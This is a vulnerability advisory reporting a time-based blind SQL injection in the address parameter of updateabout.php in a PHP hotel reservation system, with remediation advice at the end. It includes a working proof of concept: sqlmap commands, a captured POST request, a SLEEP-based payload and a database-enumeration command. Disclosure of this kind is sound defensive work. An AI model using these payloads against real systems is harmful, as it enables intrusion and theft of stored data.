# Online Hotel Reservation System In PHP With Source Code - SQL Injection in updateabout.php

## NAME OF AFFECTED PRODUCT(S)

- Online Hotel Reservation System In PHP With Source Code

## Vendor Homepage

- [Online Hotel Reservation System In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-hotel-reservation-system-in-php-with-source-code/)

## AFFECTED AND/OR FIXED VERSION(S)

### submitter

- YoSheep

### VERSION(S)

- V1.0

### Software Link

- https://download.code-projects.org/details/f2af5165-f165-4d1c-9648-394dc5119f9d

## PROBLEM TYPE

### Vulnerability Type

- SQL injection

### Root Cause

- The updateabout.php component directly interpolates the address parameter into SQL statements without proper sanitization or use of prepared statements. This unsafe practice allows adversaries to inject crafted SQL payloads, thereby altering the intended query logic and executing arbitrary SQL commands against the backend database.

### Impact

Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

## DESCRIPTION

- During a security assessment of the *Online Hotel Reservation System In PHP With Source Code*, a critical SQL injection vulnerability was identified in the updateabout.php file. The flaw arises from insufficient validation of the address parameter, which is directly embedded into SQL queries. Exploitation of this flaw allows unauthenticated attackers to inject arbitrary SQL statements, gain access to sensitive data, escalate privileges, and potentially gain control of the application environment. Immediate remediation is strongly advised to mitigate the risk of exploitation.

## Vulnerability Details and Proof of Concept (PoC)

### Vulnerability type:

* Time-based blind SQL injection

### Vulnerability location:

* Parameter: address (POST)

### Proof of Concept Payloads

Using sqlmap, the injection can be demonstrated as follows:

```
python3 sqlmap.py -r ~/Desktop/sql_data.txt -p address

// sql_data.txt
POST /newhotel/admin/updateabout.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Length: 63
Cache-Control: max-age=0
Origin: http://xxx.xxx.xxx.xxx
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx.xxx.xxx.xxx/newhotel/admin/aboutus.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: 459c73fc68b74c48fed06cd2049f9e72_ssl=664f4eeb-5d8e-4bb4-aa3e-ba03dd842b3a.acZ3bo2InCUweNQ83hgDkh4-uTI; PHPSESSID=bi4ddv20nbpset9r4ce8e39882
Connection: keep-alive

address=1
```

Example Findings:

```
---
Parameter: address (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: address=1' AND (SELECT 6684 FROM (SELECT(SLEEP(5)))zSuD) AND 'YyMl'='YyMl
---
```

![image-20250825141920564](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250825141920564.png)

### Attack Demonstration

An attacker can enumerate databases with the following command:

```
python3 sqlmap.py -r ~/Desktop/sql_data.txt -p address --dbs
```

Example Result:

Extracted list of databases from the backend MySQL server.

![image-20250825144105735](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250825144105735.png)

## Suggested Remediation

1. **Use Prepared Statements and Parameterized Queries**

   Implement parameterized queries (mysqli or PDO) to ensure user inputs are treated strictly as data, preventing SQL injection.

2. **Implement Input Validation and Sanitization**

   Validate incoming parameters against expected formats (e.g., numeric IDs). Reject or sanitize unexpected input before processing.

3. **Apply the Principle of Least Privilege**

   Restrict the privileges of the database account used by the application. Avoid using high-privilege accounts (e.g., root).

4. **Conduct Regular Security Audits**

   Periodically review source code and perform penetration testing to identify and remediate potential vulnerabilities.

5. **Upgrade Deprecated Libraries**

   Replace legacy mysql_* functions with mysqli or PDO, which provide better security support and long-term maintainability.